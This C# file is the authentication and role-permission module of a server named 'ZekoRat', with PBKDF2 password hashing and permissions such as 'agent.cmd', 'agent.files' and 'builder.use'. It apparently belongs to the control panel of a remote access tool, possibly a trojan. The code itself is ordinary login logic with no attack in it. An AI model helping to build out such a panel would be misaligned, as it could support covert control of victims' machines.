using System.Security.Cryptography;
using System.Text;

namespace ZekoRat.Server;

public sealed class AuthUser
{
    public long Id { get; init; }
    public string Name { get; init; } = "";
    public string Role { get; init; } = "viewer";
    public HashSet<string> Perms { get; init; } = new();

    public bool Has(string perm) => Perms.Contains("*") || Perms.Contains(perm);
}

public static class Auth
{
    // role -> quyền
    static readonly Dictionary<string, string[]> RolePerms = new()
    {
        ["admin"] = new[] { "*" },
        ["operator"] = new[]
        {
            "agent.view", "agent.cmd", "agent.stream", "agent.files", "agent.data",
            "builder.use", "logs.view"
        },
        ["viewer"] = new[] { "agent.view", "agent.data", "logs.view" }
    };

    public static readonly string[] AllPerms =
    {
        "agent.view", "agent.cmd", "agent.stream", "agent.files", "agent.data",
        "builder.use", "logs.view", "users.manage", "sessions.manage"
    };

    public static HashSet<string> PermsFor(string role)
    {
        var set = new HashSet<string>();
        if (RolePerms.TryGetValue(role, out var arr)) foreach (var p in arr) set.Add(p);
        if (role == "admin") { set.Add("*"); }
        return set;
    }

    public static string[] Roles => RolePerms.Keys.ToArray();

    public static (string salt, string hash) Make(string pass)
    {
        var salt = Convert.ToHexString(RandomNumberGenerator.GetBytes(16)).ToLowerInvariant();
        return (salt, Hash(pass, salt));
    }

    public static string Hash(string pass, string salt)
    {
        var key = Rfc2898DeriveBytes.Pbkdf2(
            Encoding.UTF8.GetBytes(pass),
            Convert.FromHexString(salt),
            100_000, HashAlgorithmName.SHA256, 32);
        return Convert.ToHexString(key).ToLowerInvariant();
    }

    public static bool Verify(string pass, string salt, string hash)
    {
        try
        {
            var calc = Hash(pass, salt);
            return CryptographicOperations.FixedTimeEquals(
                Convert.FromHexString(calc), Convert.FromHexString(hash));
        }
        catch { return false; }
    }

    public static string NewToken() =>
        Convert.ToHexString(RandomNumberGenerator.GetBytes(24)).ToLowerInvariant();
}
